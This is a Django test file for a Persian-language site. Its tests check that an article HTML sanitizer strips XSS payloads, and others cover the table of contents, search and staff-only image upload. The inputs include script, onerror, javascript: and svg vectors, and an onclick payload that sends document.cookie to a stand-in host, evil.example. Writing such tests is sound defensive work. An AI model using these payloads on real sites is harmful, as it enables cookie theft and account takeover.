"""
XSS regression tests for apps.core.sanitize.sanitize_article_html — this is
the only thing standing between admin-authored article HTML and the
{{ article.content|safe }} render in templates/articles/article_detail.html.

NOTE ON EXECUTION: these are real Django TestCase tests, but running them
requires Django + bleach installed, which this sandbox cannot do (no PyPI
egress — verified earlier). They ARE written to actually execute the real
sanitize_article_html() function (not mocked), so once run in a real
environment (`python manage.py test apps.articles`) they give a genuine
pass/fail signal. Until then, this file's status is: implemented, execution
BLOCKED pending a real Django+bleach environment.
"""
from django.core.files.uploadedfile import SimpleUploadedFile
from django.test import TestCase
from django.urls import reverse

from apps.core.sanitize import sanitize_article_html
from apps.gallery.tests import TINY_PNG

from .models import Article, ArticleCategory


def make_test_image(name="c.png"):
    return SimpleUploadedFile(name, TINY_PNG, content_type="image/png")


class ArticleSanitizationXSSTests(TestCase):
    """Exercises the exact payload classes called out in the security audit."""

    def test_script_tag_is_stripped(self):
        raw = "<p>Hello</p><script>alert(1)</script>"
        cleaned = sanitize_article_html(raw)
        self.assertNotIn("<script", cleaned.lower())
        self.assertNotIn("alert(1)", cleaned)

    def test_event_handler_attribute_is_stripped(self):
        raw = '<img src="x.jpg" onerror="alert(1)">'
        cleaned = sanitize_article_html(raw)
        self.assertNotIn("onerror", cleaned.lower())

    def test_javascript_url_is_stripped(self):
        raw = '<a href="javascript:alert(1)">click me</a>'
        cleaned = sanitize_article_html(raw)
        self.assertNotIn("javascript:", cleaned.lower())

    def test_onclick_on_arbitrary_tag_is_stripped(self):
        raw = '<div onclick="fetch(\'https://evil.example/steal?c=\'+document.cookie)">click</div>'
        cleaned = sanitize_article_html(raw)
        self.assertNotIn("onclick", cleaned.lower())
        self.assertNotIn("document.cookie", cleaned)

    def test_iframe_is_stripped(self):
        raw = '<iframe src="https://evil.example"></iframe>'
        cleaned = sanitize_article_html(raw)
        self.assertNotIn("<iframe", cleaned.lower())

    def test_svg_script_vector_is_stripped(self):
        # A classic filter-bypass vector: <script> nested inside <svg>.
        raw = '<svg><script>alert(1)</script></svg>'
        cleaned = sanitize_article_html(raw)
        self.assertNotIn("<script", cleaned.lower())
        self.assertNotIn("<svg", cleaned.lower())  # svg isn't in our allowlist either

    def test_data_uri_script_in_src_is_stripped_or_neutralized(self):
        raw = '<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">'
        cleaned = sanitize_article_html(raw)
        # bleach's default allowed protocols (http/https/mailto) exclude
        # `data:` entirely, so the whole attribute must be dropped.
        self.assertNotIn("data:text/html", cleaned)

    def test_legitimate_formatting_survives(self):
        """The sanitizer must not be so aggressive that normal editor output breaks."""
        raw = (
            "<h2>عنوان</h2><p>این یک <strong>متن مهم</strong> است.</p>"
            '<ul><li>مورد اول</li><li>مورد دوم</li></ul>'
            '<a href="https://partonoor.com/projects/">مشاهده پروژه‌ها</a>'
        )
        cleaned = sanitize_article_html(raw)
        self.assertIn("<h2>", cleaned)
        self.assertIn("<strong>", cleaned)
        self.assertIn("<ul>", cleaned)
        self.assertIn('href="https://partonoor.com/projects/"', cleaned)

    def test_sanitization_runs_on_model_save_not_just_in_admin(self):
        """Regression guard: sanitization must live in Article.save(), so it
        cannot be bypassed by any future entry point (API, management
        command, data migration) that doesn't go through the admin form."""
        from apps.articles.models import Article, ArticleCategory

        category = ArticleCategory.objects.create(title="تست")
        article = Article(
            title="تست XSS",
            excerpt="خلاصه",
            content="<p>safe</p><script>alert(1)</script>",
            category=category,
        )
        article.cover_image = "articles/test.jpg"  # path only; no real file needed for this assertion path
        article.save()
        self.assertNotIn("<script", article.content.lower())


class ArticleReadingTests(TestCase):
    def _article(self, content):
        return Article.objects.create(
            title="مقاله‌ی آزمایشی", slug="test-article", excerpt="خلاصه",
            content=content, category=ArticleCategory.objects.create(title="مقالات"),
            cover_image=make_test_image("c.png"), published=True)

    def test_detail_builds_table_of_contents_with_anchor_ids(self):
        a = self._article("<h2>مقدمه</h2><p>متن</p><h2>نتیجه‌گیری</h2><p>پایان</p>")
        response = self.client.get(a.get_absolute_url())
        self.assertEqual([t["title"] for t in response.context["toc"]], ["مقدمه", "نتیجه‌گیری"])
        self.assertContains(response, 'id="%s"' % response.context["toc"][0]["id"])

    def test_text_is_real_html_not_screenshots(self):
        a = self._article("<h2>مقدمه</h2><p>این متن واقعی است.</p>")
        html = self.client.get(a.get_absolute_url()).content.decode()
        self.assertIn("این متن واقعی است.", html)

    def test_search_finds_text_inside_article_body(self):
        self._article("<p>کلمه‌ی یکتای‌جست‌وجو</p>")
        response = self.client.get(reverse("articles:list"), {"q": "یکتای‌جست‌وجو"})
        self.assertEqual(response.context["page_obj"].paginator.count, 1)

    def test_inline_image_upload_requires_staff(self):
        response = self.client.post(reverse("articles:upload_image"), {})
        self.assertIn(response.status_code, (302, 403))

    def test_inline_image_upload_rejects_non_images_for_staff(self):
        from django.contrib.auth import get_user_model
        from django.core.files.uploadedfile import SimpleUploadedFile
        staff = get_user_model().objects.create_user("ed", "e@x.ir", "pw12345!", is_staff=True)
        self.client.force_login(staff)
        bad = SimpleUploadedFile("x.png", b"not an image", content_type="image/png")
        response = self.client.post(reverse("articles:upload_image"), {"image": bad})
        self.assertEqual(response.status_code, 400)
